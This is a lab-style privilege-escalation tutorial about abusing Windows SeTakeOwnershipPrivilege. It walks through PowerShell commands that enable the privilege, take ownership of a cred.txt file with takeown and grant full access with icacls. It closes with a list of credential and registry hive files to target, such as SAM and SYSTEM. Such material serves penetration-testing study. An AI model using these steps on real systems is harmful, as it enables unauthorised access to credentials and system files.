---
title: SeTakeOwnershipPrivilege
date: 2026-03-06 11:50:42

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - User
tags:

cover: /img/privesc.png
top_img: /img/bg-img.jpg
description: Privilege escalation using the SeTakeOwnershipPrivilege Privilege.
---



> ➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : 

- `Take Ownership → Modify The DACL (ACL) → Gain Full Access`

> ➜ This can lead us to : 

1. Read protected files  

    Take ownership → change ACL → read sensitive files (creds, keys, flags).

2. Privilege escalation / RCE  

    Take ownership of a config/script used by a privileged service → modify it → code runs as SYSTEM/service account.

3. Denial of Service (DoS) 

    Take ownership → break ACLs on critical files → service/app stops working.

4. GPO → ownership abuse (domain)

    Abuse GPO to grant the privilege `SeTakeOwnershipPrivilege` → then do any of the above on file shares or systems.

#### Enabling SeTakeOwnershipPrivilege

```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
```

> ➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1).


```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

#### Checking File Ownership

Check out the owner of the IT directory.

```powershell
PS C:\> cmd /c dir /q 'C:\Department Shares\Private\IT'
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
```


> ➜  IT share appears to be owned by a service account `sccm_svc`.


#### Taking Ownership of the File

> ➜ Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell
PS C:\> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

#### Confirming Ownership Changed

```powershell
PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name            Directory                            Owner
cred.txt        C:\Department Shares\Private\IT      WINLPE-SRV01\htb-student
```

#### Modifying the File ACL ( Grant Ourself full privileges over the target file )

```powershell
PS C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

> ➜ Now we can () modify, read, etc ) the file.


#### Interesting Files To Check 

```powershell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```